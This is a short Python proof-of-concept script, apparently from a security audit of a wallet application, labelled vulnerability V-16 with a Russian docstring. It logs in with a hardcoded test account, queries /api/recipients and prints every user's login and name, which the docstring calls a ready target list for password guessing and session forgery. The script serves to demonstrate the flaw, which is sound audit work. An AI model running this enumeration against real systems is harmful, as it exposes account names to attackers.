# -*- coding: utf-8 -*-
"""V-16. Перечисление пользователей через /api/recipients.

Любой вошедший получает полный список логинов и имён (включая admin/кассу/
бухгалтера) — готовый список целей для подбора и подделки сессий.
"""
import json

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("Перечисление пользователей").parse_args()
    c = Client(a.base)
    c.login("ivanov", "workplace1")
    rows = json.loads(c.get("/api/recipients")[2].decode("utf-8"))
    for r in rows:
        banner(f"{r['login']} — {r['name']}")
    if len(rows) < 2:
        fail("список пуст")
    ok(f"раскрыто пользователей: {len(rows)}")


if __name__ == "__main__":
    main()
